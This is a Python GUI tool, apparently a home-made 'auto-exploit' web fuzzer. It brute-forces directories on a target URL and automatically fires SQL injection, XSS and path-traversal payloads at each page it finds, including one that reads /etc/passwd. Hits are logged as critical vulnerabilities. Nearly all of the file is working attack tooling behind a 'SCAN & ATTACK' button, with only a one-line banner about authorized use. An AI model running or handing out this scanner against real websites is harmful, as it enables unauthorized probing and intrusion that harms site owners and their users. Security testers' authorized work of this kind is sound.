import customtkinter as ctk
import requests
import threading
import os
import time
from concurrent.futures import ThreadPoolExecutor


HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/114.0.0.0"}
stop_event = threading.Event()
total_requests = 0
success_count = 0
vulnerability_count = 0
start_time = 0



PARAMETERS = ["id", "cat", "search", "query", "q", "page", "user", "dir", "item"]


VULNERABILITY_PAYLOADS = {
    "SQL Injection (SQLi)": {
        "payload": "1'",
        "signatures": ["Server Error", "Syntax error", "Exception", "SQL", "Error", "mysql_"]
    },
    "Cross-Site Scripting (XSS)": {
        "payload": "<script>alert(1)</script>",
        "signatures": ["<script>alert(1)</script>"]
    },
    "Local File Inclusion (LFI)": {
        "payload": "../../../../etc/passwd",
        "signatures": ["root:x:0:0", "daemon:x:1:1"]
    }
}




def test_vulnerability(found_url):

    global vulnerability_count, total_requests

    for vuln_name, details in VULNERABILITY_PAYLOADS.items():
        if stop_event.is_set(): break

        for param in PARAMETERS:
            test_url = f"{found_url}?{param}={details['payload']}"

            try:
                response = requests.get(test_url, headers=HEADERS, timeout=3)
                total_requests += 1

                for signature in details["signatures"]:
                    if signature in response.text:
                        vulnerability_count += 1
                        write_log(f"\n[!!!] UNIVERSAL SCAN - CRITICAL VULNERABILITY: {vuln_name} DETECTED!")
                        write_log(f"[>] Vector: {test_url}\n")

                        with open("Critical_Vulnerabilities.txt", "a") as f:
                            f.write(f"[{vuln_name}] {test_url}\n")
                        break  # Move to next vulnerability if found
            except:
                pass


def send_request(full_url):

    global total_requests, success_count
    if stop_event.is_set(): return

    try:
        response = requests.get(full_url, headers=HEADERS, timeout=3)
        total_requests += 1

        if response.status_code == 200:
            success_count += 1
            write_log(f"[+] DIRECTORY FOUND: {full_url}")

            # Send the found directory to the Auto-Exploit module
            test_vulnerability(full_url)

    except:
        pass


def update_statistics():

    global total_requests, success_count, vulnerability_count, start_time
    while not stop_event.is_set():
        elapsed_time = time.time() - start_time
        if elapsed_time > 0:
            rps = total_requests / elapsed_time
            label_stats.configure(
                text=f"Requests: {total_requests} | Dirs: {success_count} | Vulns: {vulnerability_count} | RPS: {rps:.1f}")
        time.sleep(0.5)


def scan_loop(target, wordlist, extensions):

    with ThreadPoolExecutor(max_workers=30) as executor:
        for word in wordlist:
            if stop_event.is_set(): break
            base = target if target.endswith("/") else target + "/"
            executor.submit(send_request, base + word)
            for ext in extensions:
                executor.submit(send_request, base + word + ext)

    if stop_event.is_set():
        write_log("\n[!] Scan canceled by user.")
    else:
        write_log("\n" + "=" * 50)
        write_log("AUTOMATED PENTEST REPORT")
        write_log("=" * 50)
        write_log(f"Directories Found: {success_count}")
        write_log(f"Critical Vulnerabilities Found: {vulnerability_count}")
        if vulnerability_count > 0:
            write_log("\n[!] Details saved to 'Critical_Vulnerabilities.txt'.")
        write_log("=" * 50 + "\n")


def start_fuzzer():

    global start_time, total_requests, success_count, vulnerability_count
    stop_event.clear()
    total_requests = success_count = vulnerability_count = 0
    start_time = time.time()

    target = entry_target.get().strip()


    if target and not target.startswith("http://") and not target.startswith("https://"):
        target = "http://" + target
        write_log("[*] Warning: 'http://' prefix was missing, added automatically!")

    wordlist_path = entry_wordlist.get().strip()
    extensions = [ext.strip() for ext in entry_extensions.get().split(",") if ext.strip()]

    if not os.path.exists(wordlist_path):
        write_log("[-] Error: Wordlist file not found!");
        return

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        words = [s.strip() for s in f.readlines() if s.strip()]

    write_log(f"[*] Fuzz & Exploit Engine Started: {len(words)} words loaded.\n")

    threading.Thread(target=update_statistics, daemon=True).start()
    threading.Thread(target=scan_loop, args=(target, words, extensions)).start()


def select_file():

    file_path = ctk.filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    if file_path:
        entry_wordlist.delete(0, ctk.END)
        entry_wordlist.insert(0, file_path)


def stop_scan():

    stop_event.set()
    write_log("[!] Stop command sent (Waiting for current requests to finish)...")


def write_log(message):
    """Appends messages to the UI console."""
    textbox_log.insert(ctk.END, message + "\n")
    textbox_log.see(ctk.END)



ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

app = ctk.CTk()
app.title("Pro-Fuzzer v4.0 (Auto-Exploit Edition)")
app.geometry("900x700")


frame = ctk.CTkFrame(app)
frame.pack(pady=10, padx=10, fill="x")

entry_target = ctk.CTkEntry(frame, placeholder_text="Target URL (http://...)", width=400)
entry_target.grid(row=0, column=0, padx=5, pady=5)

btn_start = ctk.CTkButton(frame, text="SCAN & ATTACK", fg_color="#8B0000", hover_color="#5c0000", command=start_fuzzer)
btn_start.grid(row=0, column=1, padx=5, pady=5)

btn_stop = ctk.CTkButton(frame, text="STOP", fg_color="#333333", command=stop_scan)
btn_stop.grid(row=0, column=2, padx=5, pady=5)

entry_wordlist = ctk.CTkEntry(frame, placeholder_text="wordlist.txt", width=400)
entry_wordlist.insert(0, "wordlist.txt")
entry_wordlist.grid(row=1, column=0, padx=5, pady=5)

btn_select = ctk.CTkButton(frame, text="Select File", command=select_file)
btn_select.grid(row=1, column=1, padx=5, pady=5)

entry_extensions = ctk.CTkEntry(frame, placeholder_text="Extensions (.php, .zip...)", width=400)
entry_extensions.insert(0, ".php, .bak, .zip")
entry_extensions.grid(row=2, column=0, padx=5, pady=5)


label_stats = ctk.CTkLabel(app, text="Requests: 0 | Dirs: 0 | Vulns: 0 | RPS: 0.0", font=("Arial", 14, "bold"))
label_stats.pack(pady=5)


textbox_log = ctk.CTkTextbox(app, width=880, height=450, font=("Consolas", 12))
textbox_log.pack(pady=10, padx=10)
textbox_log.insert("0.0",
                   "--- AUTO-EXPLOIT MODULE READY ---\nThis version automatically tests found pages for SQLi, XSS, and LFI.\nPlease use ONLY on authorized systems!\n\n")

app.mainloop()